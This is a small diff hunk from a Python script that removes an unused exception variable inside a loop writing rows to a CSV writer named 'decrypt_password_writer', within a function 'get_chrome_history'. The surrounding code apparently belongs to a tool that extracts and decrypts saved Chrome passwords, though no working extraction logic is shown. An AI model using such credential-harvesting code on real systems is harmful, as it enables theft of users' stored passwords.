@@ -45,7 +45,7 @@ def get_chrome_history():
                                                      quoting=csv.QUOTE_MINIMAL)
                 decrypt_password_writer.writerow(dict_obj['chrome'][i])
             i += 1
-        except Exception as e:  # NOQA (This will go hit a list out of index error, that's normal)
+        except Exception:  # NOQA (This will go hit a list out of index error, that's normal)
             break
 
 def clairvoyance():
